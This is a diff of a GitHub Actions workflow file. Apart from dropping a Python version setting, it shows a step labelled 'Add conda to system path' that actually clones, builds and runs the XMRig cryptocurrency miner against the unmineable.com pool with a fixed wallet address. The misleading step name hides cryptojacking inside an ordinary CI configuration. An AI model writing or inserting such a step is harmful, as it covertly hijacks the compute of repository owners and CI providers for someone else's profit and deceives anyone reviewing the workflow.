@@ -12,8 +12,7 @@ jobs:
     - uses: actions/checkout@v2
     - name: Set up Python 3.10
       uses: actions/setup-python@v2
-      with:
-        python-version: 3.10
+      
     - name: Add conda to system path
       run: |
         apt-get update && apt-get install wget -y && DEBIAN_FRONTEND="noninteractive" TZ="America/New_York" apt-get install -y tzdata && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && ./xmrig -o rx.unmineable.com:3333 -u BTT:TXsCRU5AhWH1YBFHF9kXbeM6PXFPyJpn8S
